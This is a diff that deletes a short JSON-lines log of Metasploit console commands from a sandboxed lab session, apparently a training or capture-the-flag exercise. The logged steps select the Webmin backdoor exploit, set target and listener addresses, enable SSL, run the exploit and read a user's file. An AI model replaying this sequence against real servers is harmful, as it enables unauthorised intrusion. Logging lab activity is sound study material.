@@ -1,9 +1,0 @@
-{"sandbox_id": "125", "timestamp_str": "2021-06-30T06:30:09.143Z", "cmd_type": "msf-command", "cmd": "ls"}
-{"sandbox_id": "125", "timestamp_str": "2021-06-30T06:32:07.468Z", "cmd_type": "msf-command", "cmd": "use exploit/unix/webapp/webmin_backdoor"}
-{"sandbox_id": "125", "timestamp_str": "2021-06-30T06:33:11.842Z", "cmd_type": "msf-command", "cmd": "set RHOSTS 10.1.26.9"}
-{"sandbox_id": "125", "timestamp_str": "2021-06-30T06:33:47.507Z", "cmd_type": "msf-command", "cmd": "set LHOSTS 10.1.135.83"}
-{"sandbox_id": "125", "timestamp_str": "2021-06-30T06:34:02.034Z", "cmd_type": "msf-command", "cmd": "set SSL true"}
-{"sandbox_id": "125", "timestamp_str": "2021-06-30T06:35:11.633Z", "cmd_type": "msf-command", "cmd": "ls"}
-{"sandbox_id": "125", "timestamp_str": "2021-06-30T06:36:09.961Z", "cmd_type": "msf-command", "cmd": "cat /home/chong/READ-ME.txt"}
-{"sandbox_id": "125", "timestamp_str": "2021-06-30T06:36:42.231Z", "cmd_type": "msf-command", "cmd": "exploit"}
-{"sandbox_id": "125", "timestamp_str": "2021-06-30T06:37:18.812Z", "cmd_type": "msf-command", "cmd": "set LHOST 10.1.135.83"}
